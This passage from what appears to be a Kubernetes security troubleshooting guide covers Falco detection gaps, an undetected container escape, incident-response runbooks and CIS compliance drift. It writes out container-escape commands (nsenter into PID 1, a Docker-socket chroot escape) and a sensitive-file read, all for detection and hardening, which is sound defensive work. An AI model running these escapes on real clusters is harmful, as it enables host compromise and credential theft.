cat /etc/falco/falco_rules.local.yaml | grep -E "sensitive|shadow|kubernetes|kubelet" Review Falco's custom rules. If no rules mention /etc/kubernetes, /var/lib/kubelet, or ServiceAccount token paths, Kubernetes-specific sensitive files are not monitored.
kubectl exec <pod> -- cat /etc/kubernetes/manifests/kube-apiserver.yaml 2>/dev/null; sleep 3; kubectl logs -n falco -l app=falco --tail=20 | grep -i "kubernetes\|sensitive" Trigger a sensitive file read and check if Falco alerts. If no alert, the path is not in the sensitive files list — add it.
kubectl get pods -A -o yaml | grep -E "hostPath.*kubernetes|hostPath.*kubelet" Find all pods with hostPath mounts to Kubernetes directories. Each one is a potential path for an attacker to read sensitive host files — these pods need extra monitoring.
🎯 #1 Root Cause: Falco's default sensitive file rules don't include Kubernetes-specific paths (/etc/kubernetes/manifests/, ServiceAccount token directories, /etc/kubernetes/pki/). The attacker read the API server manifest, SA tokens, and CA certificates — extracting critical infrastructure information without triggering any runtime alert.
🔧 How to Solve:
1. Add Kubernetes-specific paths to Falco sensitive file rules Custom rule: Read Kubernetes sensitive files — monitor reads of: /etc/kubernetes/manifests/, /etc/kubernetes/pki/, /var/lib/kubelet/, /var/run/secrets/kubernetes.io/, /etc/ssl/certs/ (CA certs). Any read from a container is CRITICAL — these files should NEVER be accessed by container processes.
2. Enable auditd on worker nodes for Kubernetes directories auditctl -w /etc/kubernetes/ -p r -k k8s_sensitive_reads Auditd logs every read of Kubernetes configuration files. Ship auditd logs to SIEM. Alert on any read from a process not in the kubelet or container runtime group.
3. Implement read-only hostPath mounts If hostPath is absolutely necessary, mount with readOnly: true. The attacker can read but NOT modify. Combined with monitoring, reads generate alerts — but modifications are blocked entirely.
4. Block hostPath entirely via PSS restricted + OPA enforce=restricted blocks hostPath. OPA policy: reject pods with hostPath except in kube-system. No pod should have hostPath access to /etc/kubernetes/ — ever. This eliminates the attack vector, not just detects it.
5. Deploy behavioral analysis for SA token usage Monitor: "which process reads the SA token?" Normally only the application's API client library. If cat, curl, or python reads the token file, it's suspicious. Alert on non-standard processes accessing SA token paths.
💡 Personal Advice:
Default Falco rules are a starting point, not the finish line. Falco ships with generic Linux rules. Your Kubernetes cluster has Kubernetes-specific attack vectors: static pod manifests, etcd PKI, kubelet configs, ServiceAccount tokens. Customize your Falco rules to monitor these paths. An attacker reading /etc/kubernetes/manifests/kube-apiserver.yaml should trigger the LOUDEST alert in your system.
Monitor READS, not just writes. Most file monitoring focuses on writes (file modification). But data exfiltration starts with reads (file access). An attacker who reads the API server config or extracts a CA certificate doesn't need to modify anything — the stolen data is the attack. Monitor reads of sensitive files. Reads are the earliest signal of reconnaissance.
ML18
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML18
Container Escape Detected Post-Incident — No Real-Time Alert on Escape

🔍 Symptom: During a post-incident forensic investigation, the team discovered that an attacker escaped from anihpj-api to the worker node 8 days ago. The attacker used nsenter --target 1 --mount --all to break out of the container namespace into the host. Three days after the escape, they accessed /var/lib/kubelet/device-plugins/ and deployed a malicious device plugin. All of this was discovered RETROACTIVELY during log analysis — no real-time alert fired. Falco rules for "namespace escape" (nsenter, unshare, setns syscalls) were not deployed or were disabled due to false positives. The escape was successful — and silent — for over a week.

  # Attacker's commands (reconstructed from forensic analysis):
  kubectl exec anihpj-api -- nsenter --target 1 --mount --uts --ipc --net --pid bash
  root@worker-3:/#   ← ESCAPED TO HOST — NO ALERT!

  kubectl logs -n falco -l app=falco --since=8d | grep -i "nsenter\|escape\|namespace"
  # No results — escape detection rules not enabled
🔴5 Most Likely Causes
  1. Falco container escape rules not enabled: Falco has rules: Namespace change via nsenter, Namespace change via setns, Namespace change via unshare. These detect the syscalls used for container escape. But they may be disabled by default or commented out because they can fire on legitimate admin activity.
  2. Privileged container enables escape without triggering syscall rules: If the container was privileged: true, the attacker has access to nsenter without needing to call unusual syscalls. The escape is effectively "authorized" by the pod spec — Falco may consider it expected behavior for a privileged container.
  3. Escape detection relies on syscall patterns — attacker used alternative method: Instead of nsenter, the attacker exploited a kernel vulnerability (CVE) or used cgroup release_agent escape. These don't use the standard escape syscalls — Falco's default rules miss them. Custom rules for kernel exploits and cgroup manipulation are needed.
  4. No monitoring for privileged container creation: The escape wouldn't have been possible if the container wasn't privileged. Alerting on privileged container creation (PSS violation, Falco rule "Privileged container started") would have caught the vulnerability BEFORE the escape. But these alerts were either disabled or ignored.
  5. Falco not monitoring host syscalls after escape: After escaping to the host, the attacker's commands run as a HOST process — not inside a container. If Falco's rules use container.id != host, host-level activity is excluded. Falco must also monitor host-level syscalls for post-escape activity.
🟡5 Less Likely Causes
  1. Escape via /proc filesystem — no syscall anomaly: The attacker used /proc/1/ns/pid and /proc/1/ns/net to enter host namespaces via file descriptors instead of nsenter. This bypasses syscall-based detection — file descriptor manipulation looks like normal process behavior.
  2. Escape via mounted Docker socket: /var/run/docker.sock was mounted into the container. The attacker used docker run --privileged --pid=host -v /:/host alpine chroot /host — escaping via the Docker API, not via Linux namespaces. Falco sees Docker API calls, not escape syscalls.
  3. Escape via CRI socket or containerd socket: Similar to Docker socket escape but via /var/run/containerd/containerd.sock. The attacker used ctr run or crictl run to launch a host-privileged container from within the compromised container.
  4. Escape via kernel module loading: The attacker loaded a kernel module (insmod) from within the container. The kernel module gave them root-level access to all memory. Falco detected the init_module syscall — but the alert was classified as WARNING (not CRITICAL) and lost in alert fatigue.
  5. No host-level process monitoring after escape: After escaping, the attacker's processes were on the host — outside any container. Falco monitors container processes. Host-level processes were invisible to Falco's container-focused rules. Host monitoring requires different rule configuration.
🟣5 New Cluster Causes
  1. Escape rules disabled due to false positives: nsenter is used legitimately by node troubleshooting tools, CSI drivers, and CNI plugins. The team disabled the rule because it fired "every time a node was debugged." Instead of tuning exceptions, they disabled the rule entirely — losing escape detection.
  2. Privileged containers allowed in user namespaces: The cluster has no policy blocking privileged containers. An attacker who gains deploy access can create a privileged pod — and escape is trivial from a privileged container. The vulnerability was the permissive policy, not just the missing detection.
  3. No escape detection in threat model: The threat model focuses on preventing initial access. Post-exploitation activities (escape, lateral movement) were not modeled — detection rules for these stages were never created.
  4. Falco configured for container-only monitoring: Falco's -pc or -pk flag filters events to "container only." Host-level events are discarded — including post-escape activity. Falco must monitor BOTH container and host events for complete escape detection.
  5. No tabletop exercise for container escape scenario: The team has never practiced responding to a container escape. Without practice, they don't know what alerts to expect — so they never verified the alerts actually work.
🔍 What to Look At:
cat /etc/falco/falco_rules.yaml | grep -A10 "Namespace change\|nsenter\|setns\|unshare" Check if escape detection rules exist and are enabled. Look for enabled: false — rules may be present but disabled.
kubectl logs -n falco -l app=falco --tail=5000 | grep -c "Namespace change" Check if escape rules have fired recently. Count alerts in the last 5000 lines. If the count is 0, either no escapes have occurred — or the rules are not detecting them.
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {ns, name}' Find all privileged pods. Every privileged pod is a potential escape vector. If ANY exist outside kube-system, escalate immediately — they enable the exact attack described here.
🎯 #1 Root Cause: Falco's container escape detection rules (nsenter, setns, unshare) are either not enabled or were disabled due to false positives. The attacker escaped from the container to the host node using nsenter — the escape was successful and the attacker operated on the host for 8 days before being discovered during retrospective forensic analysis.
🔧 How to Solve:
1. Enable and tune Falco container escape rules Enable: Namespace change via nsenter/setns/unshare. Add exceptions for known-safe processes (CSI drivers, CNI plugins) by PID or process name — NOT by disabling the entire rule. Tuning reduces false positives. Disabling eliminates detection.
2. Add rules for alternative escape techniques Monitor: cgroup release_agent writes, /proc/1/ns/ access from non-init processes, Docker socket access from unexpected containers, insmod/modprobe from containers. Cover ALL escape paths — not just nsenter.
3. Monitor host-level processes (not just containers) Configure Falco to monitor host events: -pk flag or falco.driver.kind: ebpf. After escape, the attacker's processes appear as host processes. Monitor: unexpected child processes of container runtime, shells spawned outside containers, new listening ports on the host.
4. Block privileged containers entirely (user namespaces) PSS enforce=restricted + OPA policy: reject privileged: true in all user namespaces. If pods can't be privileged, nsenter escape is massively harder. The attacker must exploit a kernel CVE — which is much rarer and harder.
5. Run tabletop exercises for container escape Quarterly exercise: simulate a container escape (in a test environment). Verify: does Falco detect it? Does PagerDuty fire? Does the on-call engineer know the response procedure? Practice turns theoretical detection into operational capability.
💡 Personal Advice:
Container escape is the worst-case scenario. Detection MUST be real-time. If an attacker escapes to the node, they have access to: every pod on that node, the kubelet's credentials, the container runtime socket, and potentially the control plane (if it's a control plane node). Every SECOND of undetected host access is catastrophic. Escape detection is the most important Falco rule. Enable it. Test it. Never disable it.
Prevention > Detection for container escape. If your pods aren't privileged, don't have hostPID, don't mount hostPaths, and have capabilities dropped — container escape is extremely difficult. Detection catches what prevention misses. But prevention (PSS, OPA, securityContext) reduces the attack surface so dramatically that escape becomes nearly impossible. Invest in both.
ML19
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML19
No Incident Response Runbook for Container Compromise — Chaotic Response

🔍 Symptom: At 3:17 AM, Falco detected a reverse shell from anihpj-api. The on-call engineer acknowledged the PagerDuty alert — but had NO IDEA what to do next. They spent 15 minutes searching for the runbook. They found an outdated Wiki page from 2023 that said "SSH to the pod and investigate." They spent 20 minutes trying to SSH (the pod has no SSH). They asked in Slack: "How do I isolate a pod?" — at 3:45 AM, with no response. By the time they figured out kubectl delete pod, the attacker had been active for 45 minutes. The detection worked. The alerting worked. The RESPONSE failed — because there was no practiced, documented, immediately-actionable runbook.

  # Incident Timeline:
  03:17:00 — PagerDuty: CRITICAL - Reverse shell from anihpj-api
  03:17:30 — On-call engineer acknowledges alert
  03:18:00 — Engineer searches wiki for "container compromise runbook"
  03:24:00 — Finds outdated runbook (2023) — suggests SSH (pod has no SSH)
  03:30:00 — Asks Slack: "how to isolate a pod?"
  03:45:00 — Senior engineer responds: "kubectl delete pod <name> -n anihpj"
  03:46:00 — Pod deleted — attacker had 29 MINUTES of access post-detection
🔴5 Most Likely Causes
  1. No incident response runbook for container compromise: There's no documented procedure for: "What to do when Falco detects a reverse shell." The on-call engineer has to improvise at 3 AM. Runbooks must be written, reviewed, tested, and accessible in <30 seconds during an incident.
  2. Runbook is outdated and references wrong tools: The existing runbook is from 2023 — it assumes SSH access to pods, Docker runtime, and manual investigation. The current cluster has no SSH, uses containerd, and has automated tools (Falco Talon, kubectl debug) that the runbook doesn't mention.
  3. No automated response — 100% manual actions: The runbook requires the engineer to manually: identify the pod, check its namespace, dump logs, snapshot processes, isolate the pod, delete the pod, rotate credentials, and notify stakeholders. These 8 manual steps take 30+ minutes. Automation (Falco Talon) can do the first 5 in 2 seconds.
  4. No incident classification or severity levels: The runbook treats all alerts identically. "Reverse shell from production database pod" gets the same response as "unexpected process in CI pod." Severity-based playbooks ensure the RIGHT response intensity for the RIGHT threat level.
  5. Runbook not accessible during incident (wiki is down): The runbook is in Confluence — which is hosted in the SAME Kubernetes cluster. If the cluster is compromised, Confluence might be unavailable. Runbooks must be stored outside the cluster: paper copy, separate cloud doc, or printed in the NOC.
🟡5 Less Likely Causes
  1. No escalation path defined: The runbook says "investigate." But what if the on-call can't resolve it? When do they escalate to the security lead? The CTO? When do they call an all-hands incident? Without escalation triggers, the junior on-call tries to handle a critical incident alone for hours.
  2. No communication templates: The runbook doesn't include templates for: "Incident declared" Slack message, "Status update" email to stakeholders, "Incident resolved" postmortem template. The engineer spends time drafting messages instead of responding to the incident.
  3. No forensic evidence collection procedure: The runbook says "delete the pod." But it doesn't say: "BEFORE deleting, run kubectl exec <pod> -- tar czf /tmp/forensic.tar.gz /proc /tmp and kubectl cp to secure storage." Evidence is destroyed because the runbook doesn't prioritize forensic preservation.
  4. No stakeholder notification list: The runbook doesn't specify WHO to notify: CTO? Security team? Legal? PR? Compliance? The engineer spends time figuring out who needs to know — instead of containing the incident.
  5. No post-incident review process: After the incident, there's no blameless postmortem. No process improvement. The same gaps that caused the chaotic response will cause chaotic response NEXT time. Runbooks must be updated based on lessons learned from every incident.
🟣5 New Cluster Causes
  1. Incident response never practiced: The team deployed Falco but never ran a tabletop exercise. The first time they execute the IR procedure is during a real incident at 3 AM. This is the worst possible time to learn that your runbook is broken.
  2. Runbook written once and never updated: The runbook was created during initial Falco deployment. Tools, procedures, and team members changed — but the runbook stayed frozen in 2023. Runbooks must be reviewed and updated quarterly.
  3. No incident commander designated: The runbook doesn't specify WHO is in charge during an incident. Decision-making is ad-hoc. The on-call engineer, security lead, and CTO all give conflicting directions. Clear incident command structure is essential.
  4. IR runbook considered "security team's job": The platform team assumes "security handles incidents." But at 3 AM, the on-call engineer IS the platform team. Everyone on call needs basic IR training — not just the security team.
  5. No IR tooling (SOAR, case management): No Jira/ServiceNow integration for automatic ticket creation. No evidence collection automation. No timeline reconstruction. The engineer manually documents everything in a Slack thread — which is not a forensic record.
🔍 What to Look At:
Ask the on-call engineer (right now): "What do you do if Falco detects a reverse shell?" If they can't answer in <30 seconds with specific commands, the IR runbook is either: nonexistent, inaccessible, or not practiced. Every on-call engineer must know the first 3 actions by heart.
Check when the runbook was last updated. If the last update was >6 months ago, it's outdated. Tools, procedures, and team members change — the runbook must reflect current reality.
Run a tabletop exercise: inject a test Falco alert and measure response time. Measure: time to acknowledge, time to contain, time to escalate (if needed). If containment takes >5 minutes, the runbook (or automation) is insufficient.
🎯 #1 Root Cause: No current, practiced, and accessible incident response runbook exists for container compromise. The on-call engineer had no pre-defined, immediately-actionable procedure — turning a 30-second automated response into 29 minutes of chaos while the attacker continued to operate.
🔧 How to Solve:
1. Create a tiered IR runbook for container compromises Level 1 (Reverse shell/Crypto miner): IMMEDIATE → isolate pod (NetworkPolicy deny-all) → collect forensics (snapshot) → delete pod → rotate SA token → notify security lead. Level 2 (Unauthorized RBAC): escalate to security lead → investigate audit logs → revoke binding. Level 3 (Container escape): all-hands incident → isolate node → preserve evidence → rebuild node.
2. Automate Level 1 responses (no human needed) Falco Talon action: IF reverse shell/crypto miner → delete pod + collect forensics + rotate SA token. The pod is neutralized in 2 seconds. The human investigates post-containment — with the attacker already evicted. Automation eliminates the 29-minute chaos window.
3. Store runbooks outside the cluster Runbook in: GitHub (separate org), Google Doc (separate account), printed binder in NOC. NOT in Confluence hosted on the same cluster. If the cluster is compromised, the runbook must still be accessible.
4. Practice quarterly tabletop exercises Inject a test Falco alert (e.g., test reverse shell). Measure: time to detect → time to contain → time to resolve. Post-exercise: update the runbook with lessons learned. Practice turns theory into muscle memory.
5. Define incident roles and escalation paths Incident Commander (IC): on-call engineer. Security Lead: escalates within 5 minutes if IC hasn't contained. CTO: escalates within 20 minutes. All-hands: 45 minutes. Every role knows their responsibility. Escalation triggers are explicit and automatic (PagerDuty escalation policies).
💡 Personal Advice:
Detection + Alerting + Runbook + Practice = Incident Response Capability. Falco detects. PagerDuty alerts. But if the on-call engineer doesn't know what to do, the first two are wasted. Every minute spent searching for a runbook is a minute the attacker uses to dig deeper. Write the runbook. Automate what you can. Practice what you can't. The 3 AM test: if your newest on-call engineer can contain a reverse shell in <2 minutes at 3 AM, you're ready.
Automated response is the ultimate runbook. If Falco Talon can delete the pod + collect forensics + rotate the token in 2 seconds, no human runbook is needed for Level 1 incidents. The human investigates post-containment — with the attacker already removed. This is the gold standard: automation handles the urgent. Humans handle the important.
ML20
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML20
No Continuous Compliance Scanning — Drift from CIS Baseline Undetected

🔍 Symptom: Six months ago, the cluster passed CIS benchmark scans with a 98% compliance score. Since then: 3 new namespaces were created without PSS labels, 5 pods deployed without resource limits, the kubelet's --anonymous-auth was re-enabled during a node rebuild, and a new Ingress was created without TLS. No one noticed because kube-bench was run ONCE — during initial hardening. There's no continuous compliance scanning. The cluster has drifted from 98% CIS compliance to 71% — and the security team doesn't know because compliance is a point-in-time check, not a continuous process.

  kube-bench run --targets master,node   # Run 6 months ago
  == Summary ==
  98 checks PASS, 2 checks FAIL, 0 checks WARN   ← 98% compliant

  kube-bench run --targets master,node   # SAME scan TODAY
  == Summary ==
  71 checks PASS, 25 checks FAIL, 4 checks WARN   ← DRIFTED TO 71%!
🔴5 Most Likely Causes
  1. No scheduled compliance scanning (kube-bench, kubescape): kube-bench was run manually during initial hardening and never automated. No CronJob runs weekly compliance scans. No tool continuously monitors for CIS benchmark violations. Compliance is a one-time event, not an ongoing process.
  2. No drift detection between scans: Even if scans are run, there's no diff between "last week's compliance score" and "this week's compliance score." A drop from 98% to 71% should trigger an immediate alert — but without diffing, the decline is invisible until someone manually compares reports.
  3. Node rebuilds and upgrades reset hardening: When a node is rebuilt (OS upgrade, instance refresh), kubeadm join re-creates the kubelet with DEFAULT settings. --anonymous-auth=false becomes --anonymous-auth=true. Hardening applied post-build is lost. Node provisioning must include hardening as part of the bootstrap process.
  4. New resources created without compliance checks: New namespaces, Deployments, and Services are created without validating against compliance policies. No OPA/Kyverno policy enforces PSS labels on new namespaces. No check ensures new pods have resource limits. Compliance is reactive, not proactive.
  5. No compliance dashboard or alerting: Scan results are in a PDF stored in a shared drive. No dashboard shows: "current CIS score: 71% (↓ from 98%)." No alert fires when the score drops. Compliance status is invisible to both engineering and leadership.
🟡5 Less Likely Causes
  1. Compliance scan fails silently: The kube-bench CronJob runs weekly — but the pod OOMKills or the scan times out on large clusters. No alert on scan failure. "No news is good news" assumption — but the scan has been failing for 6 weeks with no results generated.
  2. Compliance scope incomplete: kube-bench scans control plane and worker nodes — but not: etcd configuration, Kubernetes API resources (namespaces, pods, RBAC), or cloud provider settings. The 98% score only reflects 60% of the actual attack surface. Compliance gaps exist in unscanned areas.
  3. Remediation actions from scan not tracked: The initial scan found 2 FAIL items. Tickets were created — but never closed. The same 2 FAIL items appear in every subsequent scan. Compliance process identifies issues but doesn't drive remediation. "Scan and forget" is not compliance.
  4. Compliance benchmark version outdated: The cluster is on Kubernetes 1.32 but kube-bench uses CIS benchmark for 1.24. New CIS checks for 1.32 are not evaluated. Compliance score is artificially high because it's measured against an old, less-stringent standard.
  5. No compliance mapping to regulatory requirements: CIS benchmarks map to PCI, SOC2, HIPAA controls. But the mapping isn't done — the team doesn't know which CIS failures impact which compliance framework. A failed CIS check that breaks PCI compliance is treated the same as a failed check with no regulatory impact.
🟣5 New Cluster Causes
  1. Compliance scanning not automated: Initial hardening was done manually. Automation (CronJob, CI pipeline) was never set up. Compliance is a manual quarterly activity — not continuous monitoring.
  2. No compliance drift budget: The team doesn't define: "CIS score must not drop below 95%. Any drop >2% in one week triggers an incident." Without a drift budget, gradual erosion goes unnoticed.
  3. Compliance not integrated with infrastructure-as-code: Node hardening, PSS labels, and NetworkPolicies are applied via kubectl — not Terraform/Ansible. Changes are not version-controlled. Drift is inevitable when configuration is manual.
  4. No admission control for compliance: OPA/Kyverno could REJECT non-compliant resources at creation time — preventing drift entirely. Without preventive controls, compliance is a cleanup activity after the fact.
  5. Compliance seen as "project" not "process": The team treated CIS hardening as a one-time project with a completion date. Security hardening is an ongoing process — the cluster changes daily, and compliance must be validated continuously.
🔍 What to Look At:
kube-bench run --targets master,node --json | jq '.Totals' Run a CIS scan RIGHT NOW. Compare the pass/fail counts against the last scan. Any increase in FAIL or WARN is compliance drift that happened without detection.
kubectl get cronjobs -A | grep -iE "bench|compliance|scan|audit" Check if compliance scanning is scheduled. If no CronJob exists, compliance is a manual process — and manual processes are not performed consistently.
kubectl get ns -o json | jq '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name' Find namespaces without PSS labels. Each one is a compliance gap that didn't exist post-hardening — drift has occurred without detection.
🎯 #1 Root Cause: Compliance scanning (CIS benchmarks) was performed ONCE during initial hardening and never automated. The cluster has drifted from 98% to 71% compliance over 6 months — new resources without security controls, node rebuilds reverting hardening, and unmonitored configuration changes accumulated silently because compliance is a point-in-time event, not a continuous process.
🔧 How to Solve:
1. Schedule weekly automated compliance scans CronJob: kube-bench run --targets master,node --json --outputfile /tmp/report.json. Push results to: SIEM (Elasticsearch), metrics (Prometheus), or compliance dashboard. Weekly scans catch drift within 7 days — not 6 months.
2. Alert on compliance score degradation Prometheus alert: kube_bench_fail_count > baseline + 2. If FAIL count increases by more than 2 in a week, trigger PagerDuty. Drift is detected and escalated — not silently accumulated.
3. Integrate hardening into node provisioning (IaC) Node bootstrap (cloud-init, Ansible, Terraform): apply ALL hardening steps (kubelet flags, sysctl, auditd) at provision time. Nodes come online hardened — no post-provisioning hardening needed. Rebuilds don't revert security.
4. Enforce compliance at admission time Kyverno/OPA policies: reject resources that violate compliance requirements. No new namespace without PSS labels. No pod without resource limits. No Ingress without TLS. Preventive controls stop drift before it starts.
5. Create a compliance dashboard with trends Grafana dashboard: CIS compliance score over time (weekly trend). Drift by category (node, control plane, API resources). Remediation tracking (open/closed tickets per CIS check). Compliance becomes visible to leadership — not just a PDF in a shared drive.
💡 Personal Advice:
Compliance is a process, not a project. CIS hardening is not a checkbox you tick once. Your cluster changes EVERY DAY: new namespaces, new pods, node rebuilds, config updates. Every change can introduce drift. If you're not continuously scanning, you're drifting. A 98% score in January means nothing if you don't know what it is in June. Automate scanning. Alert on drift. Make compliance visible.
Preventive controls (admission) + Detective controls (scanning) = Continuous Compliance. Admission policies PREVENT non-compliant resources from being created. Scheduled scans DETECT what admission missed (node changes, config modifications). Both are needed. Admission alone can't stop node drift. Scanning alone can't prevent resource creation. Together, they close the compliance loop.
